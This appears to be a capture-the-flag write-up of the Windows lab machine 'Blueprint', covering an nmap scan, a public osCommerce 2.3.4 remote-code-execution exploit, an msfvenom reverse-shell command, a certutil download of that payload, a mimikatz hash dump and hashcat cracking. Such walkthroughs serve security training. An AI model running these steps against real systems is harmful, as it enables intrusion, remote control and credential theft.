# Blueprint

This one is a windows box with minimal hints.

## Port scan

```nmap
PORT      STATE    SERVICE      REASON          VERSION
80/tcp    open     http         syn-ack ttl 125 Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: 404 - File or directory not found.
|_http-server-header: Microsoft-IIS/7.5
135/tcp   open     msrpc        syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open     netbios-ssn  syn-ack ttl 125 Microsoft Windows netbios-ssn
443/tcp   open     ssl/http     syn-ack ttl 125 Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
| SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
445/tcp   open     microsoft-ds syn-ack ttl 125 Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open     mysql        syn-ack ttl 125 MariaDB (unauthorized)
5172/tcp  filtered pcoip-mgmt   no-response
7974/tcp  filtered unknown      no-response
8080/tcp  open     http         syn-ack ttl 125 Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
21620/tcp filtered unknown      no-response
32396/tcp filtered unknown      no-response
38683/tcp filtered unknown      no-response
46207/tcp filtered unknown      no-response
49152/tcp open     msrpc        syn-ack ttl 125 Microsoft Windows RPC
49153/tcp open     msrpc        syn-ack ttl 125 Microsoft Windows RPC
49154/tcp open     msrpc        syn-ack ttl 125 Microsoft Windows RPC
49158/tcp open     msrpc        syn-ack ttl 125 Microsoft Windows RPC
49159/tcp open     msrpc        syn-ack ttl 125 Microsoft Windows RPC
49160/tcp open     msrpc        syn-ack ttl 125 Microsoft Windows RPC
52621/tcp filtered unknown      no-response
Aggressive OS guesses: Microsoft Server 2008 R2 SP1 (96%), Microsoft Windows 7 or 8.1 R1 (93%)

```

## Enumeration

I went against what I normally do and headed for the webserver first. It's running some CMS I haven't heard of before `osCommerce Online Merchang v2.3.4`. The version is leaked in the webapp's URL.

I was able to find a few exploits for this using searchsploit, I chose to test the most recent RCE exploit `50128.py`


## Exploitation 

This exploit was failing out of the box because the webserver is using a self-signed cert...I just added `verify=False` to the parameter list of each `request.*()` call to bypass this. The exploit gives me an incomplete root RCE shell. I quickly jumped over to a reverse tcp shell which I generated using msfvenom.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<myIP> LPORT=4444 -f exe -o shell.exe
```

Then I used `certutil` to download the reverse shell and executed it. I now have a much more stable shell as `nt authority\system`.

I was able to read the root.txt file and install and run mimikatz to dump the NTLM hashes for cracking.

Trying to crack with hashcat

```bash
hashcat -m 1000 -a 3 hash.txt
```

As I sit here reviewing scans of other boxes and listening to my computer, obviously pissed about the heavy load hashcat is putting on it....I remember using something to just lookup the hashes online in the past. A quick google brought me back to [CrackStation](https://crackstation.net/). I was able to paste the hash and quickly look it up.
